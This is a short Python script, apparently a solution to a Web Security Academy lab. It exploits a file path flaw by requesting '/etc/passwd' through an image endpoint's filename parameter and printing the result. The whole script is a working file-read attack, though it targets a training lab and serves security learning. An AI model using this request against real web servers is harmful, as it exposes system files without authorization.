import requests

s = requests.Session()

if __name__ == "__main__":
    site = 'accf1f461e95a930c0d72fe6001100fe.web-security-academy.net'
    path = '/etc/passwd'
    url = f'''https://{site}/image?filename={path}'''
    resp = s.get(url)
    print(resp.text)
